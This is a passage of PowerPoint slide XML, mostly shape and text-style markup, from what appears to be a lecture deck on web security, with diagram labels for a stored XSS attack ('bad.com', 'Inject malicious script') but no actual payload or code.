            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="object 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7534556" y="1360115"/>
            <a:ext cx="1484779" cy="830584"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF2A06"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="2194" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPts val="18"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="3177">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="157586" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2206" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>bad.com</a:t>
            </a:r>
            <a:endParaRPr sz="2206">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="159753" name="object 9"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7887541" y="2745441"/>
            <a:ext cx="0" cy="1497386"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 4537 h 2130425"/>
              <a:gd name="T1" fmla="*/ 4537 h 2130425"/>
              <a:gd name="T2" fmla="*/ 0 60000 65536"/>
              <a:gd name="T3" fmla="*/ 0 60000 65536"/>
            </a:gdLst>
            <a:ahLst/>
            <a:cxnLst>
              <a:cxn ang="T2">
                <a:pos x="0" y="T0"/>
              </a:cxn>
              <a:cxn ang="T3">
                <a:pos x="0" y="T1"/>
              </a:cxn>
            </a:cxnLst>
            <a:rect l="0" t="0" r="r" b="b"/>
            <a:pathLst>
              <a:path h="2130425">
                <a:moveTo>
                  <a:pt x="-38100" y="1065129"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="38100" y="1065129"/>
                </a:lnTo>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="2130259">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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="159754" name="object 10"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7783886" y="4216213"/>
            <a:ext cx="207309" cy="214313"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 590 w 304800"/>
              <a:gd name="T1" fmla="*/ 0 h 304800"/>
              <a:gd name="T2" fmla="*/ 0 w 304800"/>
              <a:gd name="T3" fmla="*/ 0 h 304800"/>
              <a:gd name="T4" fmla="*/ 294 w 304800"/>
              <a:gd name="T5" fmla="*/ 1311 h 304800"/>
              <a:gd name="T6" fmla="*/ 590 w 304800"/>
              <a:gd name="T7" fmla="*/ 0 h 3048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04800" h="304800">
                <a:moveTo>
                  <a:pt x="304800" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="152400" y="304800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="30480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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="159755" name="object 11"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8051426" y="2951349"/>
            <a:ext cx="320769" cy="330574"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 796 w 471170"/>
              <a:gd name="T1" fmla="*/ 281 h 471170"/>
              <a:gd name="T2" fmla="*/ 856 w 471170"/>
              <a:gd name="T3" fmla="*/ 433 h 471170"/>
              <a:gd name="T4" fmla="*/ 899 w 471170"/>
              <a:gd name="T5" fmla="*/ 600 h 471170"/>
              <a:gd name="T6" fmla="*/ 924 w 471170"/>
              <a:gd name="T7" fmla="*/ 778 h 471170"/>
              <a:gd name="T8" fmla="*/ 933 w 471170"/>
              <a:gd name="T9" fmla="*/ 961 h 471170"/>
              <a:gd name="T10" fmla="*/ 924 w 471170"/>
              <a:gd name="T11" fmla="*/ 1145 h 471170"/>
              <a:gd name="T12" fmla="*/ 899 w 471170"/>
              <a:gd name="T13" fmla="*/ 1322 h 471170"/>
              <a:gd name="T14" fmla="*/ 856 w 471170"/>
              <a:gd name="T15" fmla="*/ 1489 h 471170"/>
              <a:gd name="T16" fmla="*/ 796 w 471170"/>
              <a:gd name="T17" fmla="*/ 1640 h 471170"/>
              <a:gd name="T18" fmla="*/ 723 w 471170"/>
              <a:gd name="T19" fmla="*/ 1764 h 471170"/>
              <a:gd name="T20" fmla="*/ 642 w 471170"/>
              <a:gd name="T21" fmla="*/ 1851 h 471170"/>
              <a:gd name="T22" fmla="*/ 556 w 471170"/>
              <a:gd name="T23" fmla="*/ 1903 h 471170"/>
              <a:gd name="T24" fmla="*/ 466 w 471170"/>
              <a:gd name="T25" fmla="*/ 1921 h 471170"/>
              <a:gd name="T26" fmla="*/ 377 w 471170"/>
              <a:gd name="T27" fmla="*/ 1903 h 471170"/>
              <a:gd name="T28" fmla="*/ 291 w 471170"/>
              <a:gd name="T29" fmla="*/ 1851 h 471170"/>
              <a:gd name="T30" fmla="*/ 210 w 471170"/>
              <a:gd name="T31" fmla="*/ 1764 h 471170"/>
              <a:gd name="T32" fmla="*/ 137 w 471170"/>
              <a:gd name="T33" fmla="*/ 1640 h 471170"/>
              <a:gd name="T34" fmla="*/ 77 w 471170"/>
              <a:gd name="T35" fmla="*/ 1489 h 471170"/>
              <a:gd name="T36" fmla="*/ 34 w 471170"/>
              <a:gd name="T37" fmla="*/ 1322 h 471170"/>
              <a:gd name="T38" fmla="*/ 9 w 471170"/>
              <a:gd name="T39" fmla="*/ 1145 h 471170"/>
              <a:gd name="T40" fmla="*/ 0 w 471170"/>
              <a:gd name="T41" fmla="*/ 961 h 471170"/>
              <a:gd name="T42" fmla="*/ 9 w 471170"/>
              <a:gd name="T43" fmla="*/ 778 h 471170"/>
              <a:gd name="T44" fmla="*/ 34 w 471170"/>
              <a:gd name="T45" fmla="*/ 600 h 471170"/>
              <a:gd name="T46" fmla="*/ 77 w 471170"/>
              <a:gd name="T47" fmla="*/ 433 h 471170"/>
              <a:gd name="T48" fmla="*/ 137 w 471170"/>
              <a:gd name="T49" fmla="*/ 281 h 471170"/>
              <a:gd name="T50" fmla="*/ 210 w 471170"/>
              <a:gd name="T51" fmla="*/ 158 h 471170"/>
              <a:gd name="T52" fmla="*/ 291 w 471170"/>
              <a:gd name="T53" fmla="*/ 70 h 471170"/>
              <a:gd name="T54" fmla="*/ 377 w 471170"/>
              <a:gd name="T55" fmla="*/ 17 h 471170"/>
              <a:gd name="T56" fmla="*/ 466 w 471170"/>
              <a:gd name="T57" fmla="*/ 0 h 471170"/>
              <a:gd name="T58" fmla="*/ 556 w 471170"/>
              <a:gd name="T59" fmla="*/ 17 h 471170"/>
              <a:gd name="T60" fmla="*/ 642 w 471170"/>
              <a:gd name="T61" fmla="*/ 70 h 471170"/>
              <a:gd name="T62" fmla="*/ 723 w 471170"/>
              <a:gd name="T63" fmla="*/ 158 h 471170"/>
              <a:gd name="T64" fmla="*/ 796 w 471170"/>
              <a:gd name="T65" fmla="*/ 281 h 47117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71170" h="471170">
                <a:moveTo>
                  <a:pt x="401862" y="68948"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="432027" y="105877"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="453573" y="146822"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="466501" y="190444"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="470810" y="235405"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="466501" y="280366"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="453573" y="323988"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="432027" y="364933"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="401862" y="401862"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="364933" y="432027"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="323988" y="453573"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="280366" y="466501"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="235405" y="470810"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="190444" y="466501"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="146822" y="453573"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="105877" y="432027"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="68948" y="401862"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="38783" y="364933"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17237" y="323988"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4309" y="280366"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="235405"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4309" y="190444"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17237" y="146822"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="38783" y="105877"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="68948" y="68948"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="105877" y="38783"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="146822" y="17237"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="190444" y="4309"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="235405" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="280366" y="4309"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="323988" y="17237"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="364933" y="38783"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="401862" y="68948"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="0365C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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="159756" name="object 12"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8072439" y="2910729"/>
            <a:ext cx="1318091" cy="12850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58738">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPts val="2846"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2471">
                <a:solidFill>
                  <a:srgbClr val="1333FF"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2471">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPts val="2262"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2030" b="1">
                <a:solidFill>
                  <a:srgbClr val="06BC00"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Inject</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2030">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="101000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2030" b="1">
                <a:solidFill>
                  <a:srgbClr val="06BC00"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>malicious  script</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2030">
              <a:solidFill>
                <a:prstClr val="black"/>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618950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295931" y="71438"/>
            <a:ext cx="5593136" cy="678968"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr rtlCol="0"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="8779">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr spc="-21" dirty="0"/>
              <a:t>Stored </a:t>
            </a:r>
            <a:r>
              <a:rPr spc="-311" dirty="0"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr spc="-11" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr spc="49" dirty="0"/>
              <a:t>attack</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="160771" name="object 3"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7509343" y="4395508"/>
            <a:ext cx="1553415" cy="1410541"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="160772" name="object 4"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7534556" y="4430527"/>
            <a:ext cx="1484779" cy="1340503"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId3"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
